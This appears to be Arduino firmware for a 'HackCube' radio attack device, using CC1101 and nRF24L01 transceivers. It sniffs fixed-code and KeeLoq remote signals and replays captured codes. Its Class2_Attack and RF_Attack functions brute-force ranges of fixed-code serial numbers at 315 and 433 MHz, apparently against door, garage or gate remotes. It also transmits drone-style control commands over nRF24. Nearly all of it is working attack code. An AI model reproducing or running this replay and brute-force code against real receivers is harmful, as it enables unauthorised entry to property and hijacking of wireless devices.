
#include "HackCube.h"


#include "RCSwitch.h"//https://github.com/sui77/rc-switch
RCSwitch mySwitch = RCSwitch();


#include "cc1101.h"
CC1101 cc1101;

void setfreqx(unsigned long int freq) {
  unsigned long freqnum = freq / 396.734569;
  //Cube_PRINT.println(freqnum,HEX);
  byte freqx[3];
  freqx[0] = freqnum;
  freqx[1] = freqnum >> 8;
  freqx[2] = freqnum >> 16;
  //Cube_PRINT.print( freqx[2],HEX );Cube_PRINT.print(" " );Cube_PRINT.print( freqx[1],HEX);Cube_PRINT.print(" " );Cube_PRINT.print( freqx[0],HEX);Cube_PRINT.println(" " );
  cc1101.writeReg(CC1101_FREQ2, freqx[2]);
  cc1101.writeReg(CC1101_FREQ1, freqx[1]);
  cc1101.writeReg(CC1101_FREQ0, freqx[0]);
}
void setfreqx(int FREQ2, int FREQ1, int FREQ0) {
  cc1101.writeReg(CC1101_FREQ2, FREQ2);
  cc1101.writeReg(CC1101_FREQ1, FREQ1);
  cc1101.writeReg(CC1101_FREQ0, FREQ0);
}

void cc1101_config() {
  cc1101.SS_PIN = RF433_CS;
  cc1101.init();
  //cc1101.setSyncWord(syncWord);
  setfreqx(freq_cc1101);
  cc1101.disableAddressCheck();
  //cc1101.cmdStrobe(CC1101_SRX);
  cc1101.writeReg(CC1101_IOCFG2, 0x0d);

  //  cc1101.writeReg(CC1101_MDMCFG4, 0xF7);
  //cc1101.writeReg(CC1101_MDMCFG4, 0x87);//RFB 200K
  cc1101.writeReg(CC1101_MDMCFG4, 0x07);//RFB 200K
  cc1101.writeReg(CC1101_MDMCFG3, 0x93);
  //cc1101.writeReg(CC1101_AGCCTRL2, 0xB0);
  cc1101.cmdStrobe(CC1101_SRX); //F5 43
}

void cc1101_RXconfig() {
  cc1101.SS_PIN = RF433_CS;
  cc1101.writeReg(CC1101_MDMCFG4, 0x07);//RFB 200K
  cc1101.writeReg(CC1101_MDMCFG3, 0x93);
  cc1101.cmdStrobe(CC1101_SRX); //F5 43
}



#include "attack.h"
#include "rf_rollcode.h"

void cc1101_Setup() {
  //class:fixed,freq:315
  String set_class = Cube_PRINT_data.substring(Cube_PRINT_data.indexOf("class") + 6, Cube_PRINT_data.indexOf(",freq"));
  freq_cc1101 = strtoul(Cube_PRINT_data.substring(Cube_PRINT_data.indexOf("freq") + 5, Cube_PRINT_data.length()).c_str(), NULL, 10);

  if (set_class == "fixed") {
    rf_class = 1;
    detachInterrupt(1);
    cc1101.cmdStrobe(CC1101_SIDLE);
    setfreqx(freq_cc1101);
    cc1101.cmdStrobe(CC1101_SRX);
    mySwitch.enableReceive(1);//Stel de mySwitch-onderbrekingspin in om het vaste codesignaal te ontvangen
    Cube_PRINT.println("*RF_sniffer_fixed");

  } else if (set_class == "keeloq") {
    rf_class = 2;
    detachInterrupt(1);
    cc1101.cmdStrobe(CC1101_SIDLE);
    setfreqx(freq_cc1101);
    cc1101.cmdStrobe(CC1101_SRX);
    Hackradio.enableReceive(1);//Stel de onderbrekingspin in om het rolling codesignaal te ontvangen
    Cube_PRINT.println("*RF_sniffer_Keeloq");
  }
}

void RF_Switch(String action) {
  //pinMode(11,OUTPUT);
  if (action == "off") {
    digitalWrite(RF_EN, LOW);
    Cube_PRINT.println("*RF_Power off");
  } else if (action == "on") {
    digitalWrite(RF_EN, HIGH);
    Cube_PRINT.println("*RF_Power on");
    cc1101_config();
  }
}


void RF433_Setup() {
  cc1101.SS_PIN = RF433_CS;
  cc1101.init();
  //byte syncWord[2] = {0x00, 0x00};
  //cc1101.setSyncWord(syncWord);

  cc1101.setCarrierFreq(CFREQ_433);

  //cc1101.disableAddressCheck();
  cc1101.cmdStrobe(CC1101_SRX);
  cc1101.writeReg(CC1101_IOCFG2, 0x0d);
  //cc1101.writeReg(CC1101_AGCCTRL2, 0xB0);
  //cc1101.writeReg(CC1101_MDMCFG4, 0xc8);
  cc1101.writeReg(CC1101_MDMCFG4, 0xc8);
  cc1101.writeReg(CC1101_MDMCFG3, 0x93);
}






void RF315_Setup() {
  cc1101.SS_PIN = RF315_CS;
  cc1101.init();
  //byte syncWord[2] = {0x00, 0x00};
  //cc1101.setSyncWord(syncWord);
  cc1101.setCarrierFreq(CFREQ_433);
  //cc1101.disableAddressCheck();
  cc1101.cmdStrobe(CC1101_SRX);
  cc1101.writeReg(CC1101_IOCFG2, 0x0d);
  //cc1101.writeReg(CC1101_AGCCTRL2, 0xB0);
  cc1101.writeReg(CC1101_MDMCFG4, 0xc8);
  //cc1101.writeReg(CC1101_MDMCFG3, 0x93);
}


void Fixed_Config() {
  cc1101.SS_PIN = RF315_CS;
  cc1101.init();
  byte syncWord[2] = {0xFF, 0xFF};
  //  cc1101.setSyncWord(syncWord);
  cc1101.setSyncWord(syncWord);
  //cc1101.setCarrierFreq(CFREQ_315);
  setfreqx(freq_cc1101);
  cc1101.disableAddressCheck();
  cc1101.cmdStrobe(CC1101_STX);
  cc1101.writeReg(CC1101_IOCFG2, 0x0d);
}


void Fixed_Config_433() {
  cc1101.SS_PIN = RF315_CS;
  cc1101.init();
  byte syncWord[2] = {0xFF, 0xFF};
  cc1101.setSyncWord(syncWord);
  //cc1101.setCarrierFreq(CFREQ_433);
  setfreqx(433750000);
  cc1101.disableAddressCheck();
  cc1101.cmdStrobe(CC1101_STX);
  cc1101.writeReg(CC1101_IOCFG2, 0x0d);
  //cc1101.writeReg(CC1101_AGCCTRL2, 0xB0);
}


void Fixed_Config_433_leftdoor() {
  cc1101.SS_PIN = RF315_CS;
  cc1101.init();
  byte syncWord[2] = {0xFF, 0xFF};
  cc1101.setSyncWord(syncWord);
  //cc1101.setCarrierFreq(CFREQ_433);
  setfreqx(434010000);
  cc1101.disableAddressCheck();
  cc1101.cmdStrobe(CC1101_STX);
  cc1101.writeReg(CC1101_IOCFG2, 0x0d);
  //cc1101.writeReg(CC1101_AGCCTRL2, 0xB0);
}


void Fixed_Config_433_RX() {
  cc1101.SS_PIN = RF315_CS;
  cc1101.init();
  setfreqx(433750000);
  cc1101.disableAddressCheck();
  cc1101.writeReg(CC1101_IOCFG2, 0x0d);
  cc1101.writeReg(CC1101_MDMCFG4, 0x07);//RFB 200K
  cc1101.writeReg(CC1101_MDMCFG3, 0x93);
  cc1101.cmdStrobe(CC1101_SRX); //F5 43
}




/*
    LigthBar
    Freq 315
*/
int Ligth_Transmitpin = RF315_GDO0;
void Ligth_Config_315() {
  cc1101.SS_PIN = RF315_CS;
  cc1101.init();
  byte syncWord[2] = {0xFF, 0xFF};
  cc1101.setSyncWord(syncWord);
  setfreqx(315000000);
  cc1101.disableAddressCheck();
  cc1101.cmdStrobe(CC1101_STX);
  cc1101.writeReg(CC1101_IOCFG2, 0x0d);

}

void ligth_bar_header() {
  digitalWrite(RF315_GDO0, HIGH);
  delayMicroseconds(1330);
  digitalWrite(RF315_GDO0, LOW);
  delayMicroseconds(650);

  for (int i = 0; i < 9; i++) {
    digitalWrite(RF315_GDO0, HIGH);
    delayMicroseconds(650);
    digitalWrite(RF315_GDO0, LOW);
    delayMicroseconds(325);
  }
}

void ligth_bar_bit_0() {
  digitalWrite(RF315_GDO0, HIGH);
  delayMicroseconds(240);
  digitalWrite(RF315_GDO0, LOW);
  delayMicroseconds(700);

}

void ligth_bar_bit_1() {
  digitalWrite(RF315_GDO0, HIGH);
  delayMicroseconds(650);
  digitalWrite(RF315_GDO0, LOW);
  delayMicroseconds(286);

}

void LigthBar_Transmit(unsigned long data) {
  //Serial.println(data,BIN);

  delay(2);
  int replay = 5;
  for (int i = 0; i < replay; i++) {
    ligth_bar_header();
    for (int a = 15; a > 0; a--) {
      if (data >> a - 1 & 1 == 1) {
        ligth_bar_bit_1();
      } else {
        ligth_bar_bit_0();
      }
    }
  }
}
//[RF][Transmit]LigthBar,freq:315,data:2600
void RF_LigthBar() {
  unsigned int freq = strtoul(Cube_PRINT_data.substring(Cube_PRINT_data.indexOf("freq") + 5, Cube_PRINT_data.indexOf(",data")).c_str(), NULL, 10);
  unsigned long  data = strtoul(Cube_PRINT_data.substring(Cube_PRINT_data.indexOf("data:") + 5, Cube_PRINT_data.length()).c_str(), NULL, 16);

  if (freq == 315) {
    Ligth_Config_315();
  }
  LigthBar_Transmit(data);
  Cube_PRINT.print("*Transmit LigthBar ");
  Cube_PRINT.print("Freq:");
  Cube_PRINT.print(freq);
  Cube_PRINT.print(",Data:");
  Cube_PRINT.println(data, HEX);
  cc1101_config();
}






int Fixed_Transmitpin = RF315_GDO0;

//void Fixed_Bit1() {
//  //Cube_PRINT.print("1");
//  digitalWrite(Fixed_Transmitpin, HIGH);
//  delayMicroseconds(820);
//  digitalWrite(Fixed_Transmitpin, LOW);
//  delayMicroseconds(287);
//  digitalWrite(Fixed_Transmitpin, LOW);
//}
//void Fixed_Bit0() {
//  //Cube_PRINT.print("0");
//  digitalWrite(Fixed_Transmitpin, HIGH);
//  delayMicroseconds(287);
//  digitalWrite(Fixed_Transmitpin, LOW);
//  //delayMicroseconds(670);
//  delayMicroseconds(820);
//  digitalWrite(Fixed_Transmitpin, LOW);
//}

/*
  void Fixed_Bit1() {
  //Cube_PRINT.print("1");
  digitalWrite(Fixed_Transmitpin, HIGH);
  delayMicroseconds(900);
  digitalWrite(Fixed_Transmitpin, LOW);
  delayMicroseconds(300);
  digitalWrite(Fixed_Transmitpin, LOW);
  }
  void Fixed_Bit0() {
  //Cube_PRINT.print("0");
  digitalWrite(Fixed_Transmitpin, HIGH);
  delayMicroseconds(300);
  digitalWrite(Fixed_Transmitpin, LOW);
  //delayMicroseconds(670);
  delayMicroseconds(900);
  digitalWrite(Fixed_Transmitpin, LOW);
  }*/


void Fixed_Bit1() {
  //Cube_PRINT.print("1");
  digitalWrite(Fixed_Transmitpin, HIGH);
  delayMicroseconds(915);
  digitalWrite(Fixed_Transmitpin, LOW);
  delayMicroseconds(305);
  digitalWrite(Fixed_Transmitpin, LOW);
}
void Fixed_Bit0() {
  //Cube_PRINT.print("0");
  digitalWrite(Fixed_Transmitpin, HIGH);
  delayMicroseconds(305);
  digitalWrite(Fixed_Transmitpin, LOW);
  //delayMicroseconds(670);
  delayMicroseconds(915);
  digitalWrite(Fixed_Transmitpin, LOW);
}





void Fixed_Bit1_Class1() {
  digitalWrite(Fixed_Transmitpin, HIGH);
  delayMicroseconds(203);
  digitalWrite(Fixed_Transmitpin, LOW);
  delayMicroseconds(58);
  digitalWrite(Fixed_Transmitpin, LOW);
}
void Fixed_Bit0_Class1() {
  digitalWrite(Fixed_Transmitpin, HIGH);
  delayMicroseconds(58);
  digitalWrite(Fixed_Transmitpin, LOW);
  delayMicroseconds(203);
  digitalWrite(Fixed_Transmitpin, LOW);
}



void Fixed_Bit1_1() {
  //Cube_PRINT.print("1");
  digitalWrite(Fixed_Transmitpin, HIGH);
  delayMicroseconds(975);
  digitalWrite(Fixed_Transmitpin, LOW);
  delayMicroseconds(325);
  digitalWrite(Fixed_Transmitpin, LOW);
}
void Fixed_Bit0_1() {
  //Cube_PRINT.print("0");
  digitalWrite(Fixed_Transmitpin, HIGH);
  delayMicroseconds(325);
  digitalWrite(Fixed_Transmitpin, LOW);
  delayMicroseconds(975);
  digitalWrite(Fixed_Transmitpin, LOW);
}



void Class2_Transmit(unsigned long data, int Func) {

  for (int a = 20; a > 0; a--) {
    if (data >> a - 1 & 1 == 1) {
      Fixed_Bit1();
    } else {
      Fixed_Bit0();
    }

  }
  for (int l = 4; l > 0; l--) {
    if (Func >> l - 1 & 1 == 1) {
      Fixed_Bit1();
    } else {
      Fixed_Bit0();
    }
  }
  Fixed_Bit0();
  //digitalWrite(Fixed_Transmitpin,LOW);
  //Cube_PRINT.println("");
}


void Class2_Attack(unsigned long   s, unsigned  long   e, int func = 0x9, long freq = 315, bool Progress = true) {
  unsigned long  EndNum = e + 1;
  unsigned long  StartlNum = s;
  unsigned long  Num = StartlNum;
  if (freq == 315) {
    Fixed_Config();
    //Serial.println("Transmit 315");
  } else if (freq == 433) {
    Fixed_Config_433_leftdoor();
    //Serial.println("Transmit 433");
  } else {
    Serial.print(freq);
    //Serial.println("Transmit ???");
  }
  if (Progress) {
    //cc1101.PrintConfig();
    Serial.print("Start:");
    Serial.print(StartlNum);
    Serial.print(",End:");
    Serial.print(EndNum);
    Serial.print(",Func:");
    Serial.println(func);
  }


  while (Num < EndNum) {

    for (int i = 0; i < 8; i++) {
      Class2_Transmit(Num, func);
      delay(12);
    }
    delay(80);
    Num++;
    if (Progress) {
      int  attack_progress = map(Num, StartlNum, EndNum, 0, 100);
      Cube_PRINT.print("[RF][Progress]");
      Cube_PRINT.println(attack_progress);
    }
    //delay(100);
  }
  if (Cube_PRINT.available() > 0) {

    cc1101_config();
    RF_action = 0;
  }
  //cc1101_config();
  //Fixed_Config_433_RX();
  //Cube_PRINT.println("END");
}

void Class2_Send() {
  for (int i = 0; i < 2; i++) {
    Class2_Transmit(0x017A5, 0x9);
    delay(12);
  }

}

/*
  void Class1_Transmit(unsigned long data) {

  for (int a = 16; a > 0; a--) {
    if (data >> a - 1 & 1 == 1) {
      //Fixed_Bit1_Class1();
      Fixed_Bit1_1();
    } else {
      //Fixed_Bit0_Class1();
      Fixed_Bit0_1();
    }

  }
  Fixed_Bit1_1(); Fixed_Bit1_1();
  Fixed_Bit1_1(); Fixed_Bit1_1();
  Fixed_Bit1_1(); Fixed_Bit1_1();
  Fixed_Bit1_1(); Fixed_Bit1_1();
  Fixed_Bit0_1();
  //Cube_PRINT.println("");
  }


  void Class1_Attack() {
  unsigned int EndNum = 0x5486;
  unsigned int Cube_PRINTNum = 0x5356;
  unsigned int Num = Cube_PRINTNum;

  while (Cube_PRINTNum < EndNum) {
    for (int i = 0; i < 2; i++) {
      Class1_Transmit(Cube_PRINTNum);
      delay(11);
    }
    Cube_PRINTNum ++;
  }
  }
*/






/*
    RF24l01
*/



byte command_fly[6] = {0x50, 0x03, 0x00, 0x03, 0x00};
byte command_s[6] = {0x50, 0x03, 0x00, 0x01, 0x00};
byte command_s1[6] = {0x50, 0x03, 0x00, 0x02, 0x00};

byte command_d[6] = {0x50, 0x03, 0x00, 0x04, 0x00};
byte command_RBT[11] = {0x03, 0x08, 0xdc, 0x05, 0xdc, 0x05, 0xdc, 0x05, 0xdc, 0x05};
byte command[4] = {0x40, 0x01, 0xff};

byte command_ulock[4] = {0x01, 0x01, 0xA1};


#include <SPI.h>
#include "nRF24L01.h"
#include "RF24.h"//https://github.com/nRF24/RF24
#include "printf.h"

RF24 radio(nRF_CE, nRF_CS_1);

#define csn(a) digitalWrite(nRF_CS, a)
#define ce(a) digitalWrite(nRF_CE, a)
uint8_t n(uint8_t reg, uint8_t value)
{
  uint8_t status;
  ce(HIGH);
  status = SPI.transfer( W_REGISTER | ( REGISTER_MASK & reg ) );
  SPI.transfer(value);
  ce(LOW);
  return status;
}

void rf24l01_Setup() {
  printf_begin();
  radio.begin();
  radio.setAutoAck(true);
  radio.setDataRate(RF24_250KBPS);// RF24_2MBPS
  radio.setPayloadSize(32);
  radio.setChannel(0x02);
  radio.setAddressWidth(5);
  radio.openWritingPipe(0x123456789aULL);
  radio.write_register(0x04, 0x53);
  radio.setCRCLength(RF24_CRC_16);
  radio.enableAckPayload();
  radio.enableDynamicAck();
  radio.stopListening();
  //radio.write(command, 3);
  printf_begin();
  radio.printDetails();

}


void rf24l01_SnifferSetup()
{
  printf_begin();
  radio.begin();
  radio.setAutoAck(false);
  //radio.setPALevel(RF24_PA_MIN);
  //radio.setDataRate(RF24_250KBPS);// RF24_2MBPS
  radio.setDataRate(RF24_250KBPS);
  radio.setPayloadSize(32);
  radio.setChannel(0x02);
  radio.setAddressWidth(5);
  radio.openReadingPipe(0, 0x123456789aULL);
  radio.write_register(0x00, 0x0E);
  radio.write_register(0x01, 0x00);
  radio.write_register(0x02, 0x03);
  radio.write_register(0x03, 0x03);
  radio.write_register(0x04, 0x53);
  radio.write_register(0x10, 0x4f);
  radio.disableCRC();
  radio.enableAckPayload();
  radio.setCRCLength(RF24_CRC_16);
  radio.startListening();
  radio.printDetails();
  //radio.print_config();

}



void rf24Sniffer() {
  if ( radio.available() )
  {
    if (millis() - SerialLastTime < Print_Time) {
      return;
    }
    SerialLastTime = millis();
    Cube_PRINT.print("c");
    Cube_PRINT.print("freq:2.42Ghz;protocol:rf24l01;modulation:fsk;data:");
    //Cube_PRINT.println("Test");
    byte command[32];
    radio.read( command, 5);
    for (int i = 0; i < 8; i++) {
      Cube_PRINT.print(command[i], HEX);
      //Cube_PRINT.print(" ");
      //PrintHex8(command[i]);
    }
    Cube_PRINT.println("");
    //byte command[32];
    ///Cube_PRINT.println(radio.Reader(command),HEX);
    delay(200);
  }
}

String Sdata;

void rfTransmit_Cube_PRINT() {
  while (Cube_PRINT.available() > 0) {
    Sdata += char(Cube_PRINT.read());
    delay(4);
  }
  if (Sdata.length() > 0) {
    if (Sdata == "w") {
      /*
        radio.write(command_RBT, 10);
        delay(100);
        //command_ulock
        radio.write(command_s, 5);
        delay(200);
        //radio.write(command_s1, 5);

        delay(200);
        radio.write(command_RBT, 10);
        delay(100);
        radio.write(command, 3);
        // radio.write(command_ulock, 3);
      */
      Cube_PRINT.println("up");
      delay(100);
      radio.write(command_fly, 5);
    } else if (Sdata == "s") {
      Cube_PRINT.println("Down");
      radio.write(command_d, 5);
      delay(10);
      radio.write(command_d, 5);
      delay(10);
    }
    Sdata = "";
  }
}






void SnifferFixedCode() {
  if (mySwitch.available()) {
    if (millis() - SerialLastTime < Print_Time) {
      mySwitch.resetAvailable();
      return;
    }
    Cube_PRINT.print("[RF][Sniffer]freq:");
    Cube_PRINT.print(String(freq_cc1101).substring(0, 3));
    Cube_PRINT.print(",protocol:Fixed-");
    Cube_PRINT.print(mySwitch.getReceivedProtocol());
    Cube_PRINT.print(",modulation:ask,func:");
    Cube_PRINT.print(mySwitch.getReceivedValue() & 0xf, HEX);
    Cube_PRINT.print(",data:");
    Cube_PRINT.println(mySwitch.getReceivedValue() >> 4, HEX);
    //String data1=String(mySwitch.getReceivedValue()>>4);
    //Cube_PRINT.println(strtoul(data1.c_str(),NULL,16));
    mySwitch.resetAvailable();
    SerialLastTime = millis();
  }
}

void RF_Transmit() {
  long freq = strtoul(Cube_PRINT_data.substring(14, 17).c_str(), NULL, 10);
  int func = strtoul(Cube_PRINT_data.substring(18, 19).c_str(), NULL, 16);
  long Serialnumber = strtoul(Cube_PRINT_data.substring(20, Cube_PRINT_data.length()).c_str(), NULL, 16);
  if (freq == 315) {
    Fixed_Config();
    //Serial.println("315Transmit");
  } else if (freq == 433) {
    Fixed_Config_433_leftdoor();
    //Serial.println("433Transmit");
  }
  for (int i = 0; i < 8; i++) {
    Class2_Transmit(Serialnumber, func);
    delay(9);
  }

  Cube_PRINT.print("*Transmit ");
  Cube_PRINT.print("Freq:");
  Cube_PRINT.print(freq);
  Cube_PRINT.print("Func:");
  Cube_PRINT.print(func, HEX);
  Cube_PRINT.print("Data:");
  Cube_PRINT.println(Serialnumber, HEX);
  cc1101_config();
}

void RF_Attack() {
  String freq = Cube_PRINT_data.substring(Cube_PRINT_data.indexOf("freq") + 5, Cube_PRINT_data.indexOf(",start"));
  String start = Cube_PRINT_data.substring(Cube_PRINT_data.indexOf("start") + 6, Cube_PRINT_data.indexOf(",end"));
  String end = Cube_PRINT_data.substring(Cube_PRINT_data.indexOf("end") + 4, Cube_PRINT_data.indexOf(",func"));
  String func = Cube_PRINT_data.substring(Cube_PRINT_data.indexOf("func") + 5, Cube_PRINT_data.length());

  long  rffreq = strtoul(freq.c_str(), NULL, 10);
  long  rfstart = strtoul(start.c_str(), NULL, 16);
  long  rfend = strtoul(end.c_str(), NULL, 16);
  int rffunc = strtoul(func.c_str(), NULL, 16);

  Class2_Attack(rfstart, rfend, rffunc, rffreq);
  cc1101_config();
}




